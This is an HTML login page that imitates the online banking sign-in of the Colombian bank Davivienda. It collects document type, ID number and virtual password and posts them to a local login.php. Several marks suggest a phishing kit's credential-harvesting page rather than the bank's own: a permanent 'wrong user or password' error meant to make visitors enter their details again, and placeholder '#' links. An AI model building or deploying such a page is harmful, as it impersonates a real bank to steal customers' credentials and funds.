<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido - Davivienda</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
</head>

<body>
    <header>
        <div class="logo">
            <img src="logo1.jpg" alt="Davivienda">
        </div>
    </header>

    <div class="main-container">
        <form action="login.php" method="post" class="auth-container">
            <h2 class="auth-title">¡Hola!</h2>
            <h3 class="auth-subtitle">Nos alegra que esté aquí</h3>

            <div class="error-message">
                Usuario o contraseña incorrectos
            </div>

            <div class="form-group">
                <label for="tipo_documento">Tipo de documento</label>
                <select name="tipo_documento" id="tipo_documento">
                    <option value="01">Cédula de Ciudadanía</option>
                    <option value="02">Cédula de Extranjería</option>
                    <option value="03">NIT</option>
                    <option value="04">Tarjeta de Identidad</option>
                    <option value="05">Pasaporte</option>
                </select>
            </div>

            <div class="form-group">
                <label for="usuario">Número de documento</label>
                <input type="text" name="usuario" id="usuario" placeholder="Ingrese su número" required
                    autocomplete="off">
            </div>

            <div class="form-group">
                <label for="contraseña">Clave Virtual</label>
                <input type="password" name="contraseña" id="contraseña" placeholder="Ingrese su clave" required>
            </div>

            <button type="submit" class="btn-primary">Continuar</button>

            <div class="mt-20">
                <a href="#" class="btn-link">¿Olvidó o bloqueó su clave?</a>
            </div>
        </form>
    </div>

    <footer>
        <p>
            <a href="#">Políticas de Seguridad</a> |
            <a href="#">Políticas de Privacidad</a> |
            <a href="#">Términos y Condiciones</a>
        </p>
        <p>© DAVIVIENDA. Todos los derechos reservados.</p>
    </footer>
</body>

</html>
